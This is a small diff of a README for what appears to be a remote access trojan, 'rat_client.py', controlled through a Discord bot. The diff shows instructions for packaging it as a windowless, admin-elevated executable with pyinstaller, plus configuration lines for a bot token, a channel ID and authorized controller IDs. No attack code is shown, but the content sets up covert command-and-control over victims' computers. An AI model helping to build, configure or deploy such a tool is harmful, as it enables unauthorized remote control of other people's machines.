@@ -14,9 +14,9 @@
 
 **for build exe use cmd pyinstaller --onefile --noconsole --admin --icon=NONE your_script_name.py**
 
-****edit in rat_client.py
+
 # Configuration - UPDATE THESE VALUES
-BOT_TOKEN = "TOKEN_BOT"
+****BOT_TOKEN = "TOKEN_BOT"
 CHANNEL_ID = "1452740152681042121"
 AUTHORIZED_USER_IDS = [
     "1449392486429626388",
